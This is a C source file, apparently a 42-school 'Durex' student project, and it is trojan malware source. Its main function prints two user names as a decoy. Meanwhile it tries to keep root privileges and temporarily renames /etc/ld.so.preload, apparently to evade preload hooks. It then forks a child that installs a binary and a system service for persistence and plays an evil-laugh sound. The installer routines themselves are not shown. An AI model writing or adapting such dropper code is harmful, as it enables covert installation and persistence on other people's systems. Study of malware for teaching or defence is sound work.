/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
/*   Updated: 2019/07/17 12:26:02 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* exit */
#include <stdlib.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>
/* rename */
#include <stdio.h>

#include "main.h"

void				print_usr_name()
{
	int				fd;

	write(STDOUT_FILENO, "rduclos\ngbourgeo\n", 18);
	if (seteuid(geteuid()) != 0)
		return ;
	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
	if (fd < 0) {
		if (rename("/etc/ld.so.preload", "/etc/mamouth"))
			if (fork() == 0)
			{
				if (!install_binary() && !install_service())
					system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
				exit(0);
			}
		rename("/etc/mamouth", "/etc/ld.so.preload");
		exit(0);
	}
	close(fd);
}

int					main(int ac, char **av)
{
	(void)ac;
	e.prog = av[0];
	print_usr_name();
	return 0;
}
